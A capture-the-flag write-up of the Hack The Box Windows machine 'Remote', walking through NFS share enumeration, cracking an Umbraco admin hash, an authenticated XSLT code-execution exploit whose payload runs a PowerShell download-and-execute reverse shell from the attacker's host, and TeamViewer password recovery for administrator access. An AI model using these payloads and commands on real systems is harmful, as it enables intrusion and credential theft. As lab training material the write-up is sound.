# Remote

Easy
Windows
10.10.10.180
CVE, Real life, Enumeration

## Preperation

Added 10.10.10.180 to /etc/hosts as remote.htb

## Recon

Verifying target OS

```
┌─[monty@parrot]─[~/ctfs/htb/boxes/remote]
└──╼ $ping remote.htb
PING remote (10.10.10.180) 56(84) bytes of data.
64 bytes from remote.htb (10.10.10.180): icmp_seq=1 ttl=127 time=59.9 ms
```

Service discovery

```
┌─[monty@parrot]─[~/ctfs/htb/boxes/remote]                                                    [9/24]
└──╼ $nmap -v -r -p- -sV -sC -T4 -oA recon/nmap/allports_enum_fast remote.htb
...
Discovered open port 21/tcp on 10.10.10.180
Discovered open port 80/tcp on 10.10.10.180
Discovered open port 111/tcp on 10.10.10.180
Discovered open port 135/tcp on 10.10.10.180
Discovered open port 139/tcp on 10.10.10.180
Discovered open port 445/tcp on 10.10.10.180
Discovered open port 2049/tcp on 10.10.10.180
Discovered open port 5985/tcp on 10.10.10.180
...
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 5m30s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-06T16:13:54
|_  start_date: N/A
```

### FTP

- Anon login allowed
- No files for download
- Cannot upload files

### HTTP

- Crawling with OWASP ZAP
- I see http://remote.htb/umbraco - login page
- It is using the umbraco cms

Names from website
- Jan Skovgaard
- Matt Brailsford
- Lee Kelleher
- Jeavon Leopold
- Jeroen Breuer

### SMB

- No null auth

### NFS (mountd)

```
┌─[✗]─[monty@parrot]─[~/ctfs/htb/boxes/remote]
└──╼ $showmount -e remote.htb
Export list for remote.htb:
/site_backups (everyone)
```
- site\_backups directory
- Mounted it locally

```
┌─[✗]─[monty@parrot]─[~/ctfs/htb/boxes/remote]
└──╼ $sudo mount -t nfs remote.htb:/site_backups/ recon/mnt/site_backups/
```

- The site connects to a SQL backend
- Credentials are found in site\_backups/App\_Data/Umbraco.sdf

```
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

admin:admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa

b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese

`hashcat -a 0 -m 100 admin_cms_hash.txt /home/monty/.../rockyou.txt`

## Inititial Access

Login to the CMS at http://remote.htb/umbraco with admin@htb.local:baconandcheese works

There is a file upload functionality on this machine, trying a PHP reverse shell ([created using](https://github.com/montysecurity/shellclip))

```
┌─[monty@parrot]─[~/ctfs/htb/boxes/remote/recon]
└──╼ $shellclip --lhost 10.10.14.187 --lport 5253 -c php
```

The file is blocked. I remember seeing an authenticated RCE exploit for Umbraco earlier, taking a look at that.

Confirmed code execution with EDB-ID 46153 and the following payload

```
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \    
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \    
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\    
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \    
{ string cmd = "10.10.14.187"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "ping"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\  
 </xsl:template> </xsl:stylesheet> ';
```

Got the target to download a reverse shell by modyifing the command on the above payload to the following:

```
string cmd = "Invoke-WebRequest \'http://10.10.14.187:8000/montysecurity.ps1\'"
```

Could not manually execute the ps1 script so I used IEX instead and got on the box

```
┌─[monty@parrot]─[~/ctfs/htb/boxes/remote]
└──╼ $sudo nc -lnvp 53
listening on [any] 53 ...
connect to [10.10.14.187] from (UNKNOWN) [10.10.10.180] 49700
whoami
iis apppool\defaultapppool
# hostname
remote
```

Payload used:
```
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \                                     
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.187:8000/montysecurit
y.ps1\')"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';
```

## Privilege Escalation

Teamviewer is installed, shows in "Program Files (x86)"

Uploaded a meterpreter shell to %TEMP% ([created using one-lin3r](https://github.com/D4Vinci/One-Lin3r))

Found Teamviewer password
```
msf6 post(windows/gather/credentials/teamviewer_passwords) > run

[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
```

Got admin with that password
```
┌─[monty@parrot]─[~/ctfs/htb/boxes/remote]
└──╼ $psexec.py administrator@remote.htb
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Requesting shares on remote.htb.....
[*] Found writable share ADMIN$
[*] Uploading file bysoscma.exe
[*] Opening SVCManager on remote.htb.....
[*] Creating service rQJM on remote.htb.....
[*] Starting service rQJM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
remote

C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::a48b:9518:15d8:b519
   Link-local IPv6 Address . . . . . : fe80::a48b:9518:15d8:b519%13
   IPv4 Address. . . . . . . . . . . : 10.10.10.180
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:7eaa%13
                                       10.10.10.
```